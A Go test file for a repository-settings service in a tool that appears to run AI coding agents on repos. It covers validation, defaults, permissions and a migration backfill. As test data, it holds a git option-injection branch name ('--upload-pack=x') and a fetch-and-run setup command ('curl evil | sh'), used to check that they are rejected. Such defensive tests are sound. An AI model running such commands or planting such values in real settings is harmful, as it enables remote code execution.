package factory_test

import (
	"context"
	"os"
	"strings"
	"testing"

	"connectrpc.com/connect/v2"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	factoryv1 "tools.xdoubleu.com/gen/factory/v1"
	"tools.xdoubleu.com/gen/factory/v1/factoryv1connect"
	"tools.xdoubleu.com/internal/constants"
)

func repoClient(t *testing.T) factoryv1connect.RepoServiceClient {
	t.Helper()
	return newRepoClient(t, true, constants.ChannelBrowser)
}

// validRepo is a repo that passes validation, named so tests can't collide.
func validRepo(name string) *factoryv1.Repo {
	return &factoryv1.Repo{
		Owner:             "octo",
		Name:              name,
		DefaultBranch:     "trunk",
		DefaultHarness:    factoryv1.Harness_HARNESS_OPENCODE,
		SetupCommands:     "npm ci",
		AgentInstructions: "Be careful.",
		TimeLimitMinutes:  15,
	}
}

func cleanRepos(t *testing.T) {
	t.Helper()
	_, err := testDB.Exec(context.Background(),
		"DELETE FROM factory.tasks WHERE repo_id IN"+
			" (SELECT id FROM factory.repos WHERE owner = 'octo')")
	require.NoError(t, err)
	_, err = testDB.Exec(context.Background(),
		"DELETE FROM factory.repos WHERE owner = 'octo'")
	require.NoError(t, err)
}

func createRepo(
	t *testing.T,
	c factoryv1connect.RepoServiceClient,
	repo *factoryv1.Repo,
) *factoryv1.Repo {
	t.Helper()
	resp, err := c.CreateRepo(
		context.Background(), &factoryv1.CreateRepoRequest{Repo: repo},
	)
	require.NoError(t, err)
	return resp.Repo
}

func TestListReposIncludesTheSeededRepo(t *testing.T) {
	c := repoClient(t)

	resp, err := c.ListRepos(context.Background(), &factoryv1.ListReposRequest{})
	require.NoError(t, err)

	var seeded *factoryv1.Repo
	for _, r := range resp.Repos {
		if r.Owner == "xdoubleu" && r.Name == "tools.xdoubleu.com" {
			seeded = r
		}
	}
	require.NotNil(t, seeded)
	assert.Equal(t, "main", seeded.DefaultBranch)
	assert.Equal(t, factoryv1.Harness_HARNESS_CLAUDE_CODE, seeded.DefaultHarness)
	assert.Equal(t, "Follow AGENTS.md.", seeded.AgentInstructions)
	assert.EqualValues(t, 60, seeded.TimeLimitMinutes)
}

func TestCreateRepoStoresEverySetting(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)

	got := createRepo(t, c, validRepo("alpha"))

	assert.NotEmpty(t, got.Id)
	assert.Equal(t, "octo", got.Owner)
	assert.Equal(t, "alpha", got.Name)
	assert.Equal(t, "trunk", got.DefaultBranch)
	assert.Equal(t, factoryv1.Harness_HARNESS_OPENCODE, got.DefaultHarness)
	assert.Equal(t, "npm ci", got.SetupCommands)
	assert.Equal(t, "Be careful.", got.AgentInstructions)
	assert.EqualValues(t, 15, got.TimeLimitMinutes)
}

func TestCreateRepoDefaults(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)

	got := createRepo(t, c, &factoryv1.Repo{Owner: " octo ", Name: " beta "})

	assert.Equal(t, "octo", got.Owner)
	assert.Equal(t, "beta", got.Name)
	assert.Equal(t, "main", got.DefaultBranch)
	assert.Equal(t, factoryv1.Harness_HARNESS_CLAUDE_CODE, got.DefaultHarness)
	assert.EqualValues(t, 60, got.TimeLimitMinutes)
}

func TestCreateRepoValidation(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)
	with := func(mod func(*factoryv1.Repo)) *factoryv1.Repo {
		r := validRepo("gamma")
		mod(r)
		return r
	}
	for name, repo := range map[string]*factoryv1.Repo{
		"no owner":         with(func(r *factoryv1.Repo) { r.Owner = "" }),
		"owner with slash": with(func(r *factoryv1.Repo) { r.Owner = "a/b" }),
		"owner leading -":  with(func(r *factoryv1.Repo) { r.Owner = "-a" }),
		"owner too long": with(func(r *factoryv1.Repo) {
			r.Owner = strings.Repeat("a", 40)
		}),
		"no name":       with(func(r *factoryv1.Repo) { r.Name = "" }),
		"name dot dot":  with(func(r *factoryv1.Repo) { r.Name = ".." }),
		"name space":    with(func(r *factoryv1.Repo) { r.Name = "a b" }),
		"name too long": with(func(r *factoryv1.Repo) { r.Name = strings.Repeat("a", 101) }),
		"branch option": with(func(r *factoryv1.Repo) {
			r.DefaultBranch = "--upload-pack=x"
		}),
		"branch dotdot": with(func(r *factoryv1.Repo) { r.DefaultBranch = "a..b" }),
		"branch space":  with(func(r *factoryv1.Repo) { r.DefaultBranch = "a b" }),
		"branch slash":  with(func(r *factoryv1.Repo) { r.DefaultBranch = "/a" }),
		"bad harness":   with(func(r *factoryv1.Repo) { r.DefaultHarness = 99 }),
		"long setup": with(func(r *factoryv1.Repo) {
			r.SetupCommands = strings.Repeat("a", 10001)
		}),
		"long instructions": with(func(r *factoryv1.Repo) {
			r.AgentInstructions = strings.Repeat("a", 20001)
		}),
		"negative limit": with(func(r *factoryv1.Repo) { r.TimeLimitMinutes = -1 }),
		"huge limit":     with(func(r *factoryv1.Repo) { r.TimeLimitMinutes = 1441 }),
	} {
		t.Run(name, func(t *testing.T) {
			_, err := c.CreateRepo(
				context.Background(), &factoryv1.CreateRepoRequest{Repo: repo},
			)
			assert.Equal(t, connect.CodeInvalidArgument, code(err))
		})
	}
}

func TestCreateRepoRejectsADuplicate(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)
	createRepo(t, c, validRepo("delta"))

	_, err := c.CreateRepo(
		context.Background(), &factoryv1.CreateRepoRequest{Repo: validRepo("delta")},
	)
	assert.Equal(t, connect.CodeAlreadyExists, code(err))
}

func TestUpdateRepoReplacesEverySetting(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)
	repo := createRepo(t, c, validRepo("epsilon"))

	repo.DefaultBranch = "develop"
	repo.DefaultHarness = factoryv1.Harness_HARNESS_CLAUDE_CODE
	repo.SetupCommands = "make deps"
	repo.AgentInstructions = "Follow AGENTS.md."
	repo.TimeLimitMinutes = 90
	resp, err := c.UpdateRepo(
		context.Background(), &factoryv1.UpdateRepoRequest{Repo: repo},
	)
	require.NoError(t, err)

	got := resp.Repo
	assert.Equal(t, repo.Id, got.Id)
	assert.Equal(t, "develop", got.DefaultBranch)
	assert.Equal(t, factoryv1.Harness_HARNESS_CLAUDE_CODE, got.DefaultHarness)
	assert.Equal(t, "make deps", got.SetupCommands)
	assert.Equal(t, "Follow AGENTS.md.", got.AgentInstructions)
	assert.EqualValues(t, 90, got.TimeLimitMinutes)
}

func TestUpdateRepoErrors(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)
	ctx := context.Background()

	missing := validRepo("zeta")
	missing.Id = "00000000-0000-0000-0000-000000000000"
	_, err := c.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: missing})
	assert.Equal(t, connect.CodeNotFound, code(err))

	bad := validRepo("zeta")
	bad.Id = "nope"
	_, err = c.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: bad})
	assert.Equal(t, connect.CodeInvalidArgument, code(err))

	one := createRepo(t, c, validRepo("eta"))
	two := createRepo(t, c, validRepo("theta"))
	two.Name = one.Name
	_, err = c.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: two})
	assert.Equal(t, connect.CodeAlreadyExists, code(err))

	one.Owner = ""
	_, err = c.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: one})
	assert.Equal(t, connect.CodeInvalidArgument, code(err))
}

func TestRepoNamesAreUniqueIgnoringCase(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)
	createRepo(t, c, validRepo("Mixed-Case"))

	_, err := c.CreateRepo(
		context.Background(),
		&factoryv1.CreateRepoRequest{Repo: validRepo("mixed-case")},
	)
	assert.Equal(t, connect.CodeAlreadyExists, code(err))
}

func TestUpdateRepoDoesNotResetUnsetSettings(t *testing.T) {
	cleanRepos(t)
	c := repoClient(t)
	repo := createRepo(t, c, validRepo("kept"))

	repo.DefaultHarness = factoryv1.Harness_HARNESS_UNSPECIFIED
	_, err := c.UpdateRepo(
		context.Background(), &factoryv1.UpdateRepoRequest{Repo: repo},
	)
	assert.Equal(t, connect.CodeInvalidArgument, code(err))
}

func TestRepoSettingsNeedABrowserSession(t *testing.T) {
	cleanRepos(t)
	browser := repoClient(t)
	repo := createRepo(t, browser, validRepo("guarded"))
	mcp := newRepoClient(t, true, constants.ChannelMCP)
	ctx := context.Background()

	_, err := mcp.CreateRepo(ctx, &factoryv1.CreateRepoRequest{Repo: validRepo("sneaky")})
	assert.Equal(t, connect.CodePermissionDenied, code(err))

	repo.SetupCommands = "curl evil | sh"
	_, err = mcp.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: repo})
	assert.Equal(t, connect.CodePermissionDenied, code(err))

	// Reading stays open to any admin credential.
	resp, err := mcp.ListRepos(ctx, &factoryv1.ListReposRequest{})
	require.NoError(t, err)
	assert.NotEmpty(t, resp.Repos)
}

func TestNonAdminDeniedRepos(t *testing.T) {
	c := newRepoClient(t, false, constants.ChannelBrowser)
	ctx := context.Background()

	_, err := c.ListRepos(ctx, &factoryv1.ListReposRequest{})
	assert.Equal(t, connect.CodePermissionDenied, code(err))
	_, err = c.CreateRepo(ctx, &factoryv1.CreateRepoRequest{Repo: validRepo("x")})
	assert.Equal(t, connect.CodePermissionDenied, code(err))
	_, err = c.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: validRepo("x")})
	assert.Equal(t, connect.CodePermissionDenied, code(err))
}

// upSection returns a goose migration's Up statements without its markers.
func upSection(t *testing.T, file string) string {
	t.Helper()
	raw, err := os.ReadFile("migrations/" + file)
	require.NoError(t, err)
	up, _, found := strings.Cut(string(raw), "-- +goose Down")
	require.True(t, found)
	up = strings.ReplaceAll(up, "-- +goose Up", "")
	up = strings.ReplaceAll(up, "-- +goose StatementBegin", "")
	return strings.ReplaceAll(up, "-- +goose StatementEnd", "")
}

// TestReposMigrationBackfillsExistingTasks builds tasks that predate the
// migration and checks they all end up on the seeded repo.
func TestReposMigrationBackfillsExistingTasks(t *testing.T) {
	ctx := context.Background()
	t.Cleanup(func() {
		_, err := testDB.Exec(ctx, "DROP SCHEMA IF EXISTS factory CASCADE")
		require.NoError(t, err)
		require.NoError(t, newApp(true, constants.ChannelBrowser).
			ApplyMigrations(ctx, testPool))
	})

	_, err := testDB.Exec(ctx, "DROP SCHEMA IF EXISTS factory CASCADE")
	require.NoError(t, err)
	_, err = testDB.Exec(ctx, upSection(t, "00001_init.sql"))
	require.NoError(t, err)
	for _, title := range []string{"old one", "old two"} {
		_, err = testDB.Exec(ctx, `
			INSERT INTO factory.tasks
				(title, created_by, body_edited_by, body_edited_channel)
			VALUES ($1, 'human:x', 'human:x', 'browser')`, title)
		require.NoError(t, err)
	}

	_, err = testDB.Exec(ctx, upSection(t, "00002_repos.sql"))
	require.NoError(t, err)

	var tasks, onSeeded int
	require.NoError(t, testDB.QueryRow(ctx, `
		SELECT count(*), count(*) FILTER (WHERE r.name = 'tools.xdoubleu.com')
		FROM factory.tasks t JOIN factory.repos r ON r.id = t.repo_id`,
	).Scan(&tasks, &onSeeded))
	assert.Equal(t, 2, tasks)
	assert.Equal(t, 2, onSeeded)

	_, err = testDB.Exec(ctx, `
		INSERT INTO factory.tasks
			(title, created_by, body_edited_by, body_edited_channel)
		VALUES ('no repo', 'human:x', 'human:x', 'browser')`)
	assert.Error(t, err, "repo_id is required once migrated")
}
